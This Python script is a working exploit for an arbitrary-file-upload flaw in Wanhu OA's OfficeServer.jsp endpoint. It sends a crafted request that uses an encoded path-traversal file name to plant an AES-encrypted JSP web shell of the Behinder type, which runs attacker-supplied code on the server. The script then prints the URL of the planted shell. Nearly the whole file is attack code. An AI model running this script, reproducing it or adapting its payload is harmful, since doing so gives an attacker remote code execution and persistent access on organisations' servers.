import time
import requests
import urllib3

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "Connection": "Keep-Alive"
        }
    exp_url = target_url+"defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
    data='''DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
111111111111111111111111111111111111111111111111
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
    success_msg = now_time() + '[SUCCESS]  上传webshell成功'
    warning_msg = now_time() + '[WARNING]  万户OA OfficeServer.jsp 任意文件上传漏洞不存在'
    error_msg = now_time() + '[万户OA OfficeServer.jsp 任意文件上传漏洞][ERROR]无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
            shell_msg = now_time() + '默认冰蝎密码:{}'.format(shell_url)
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
        

            
            
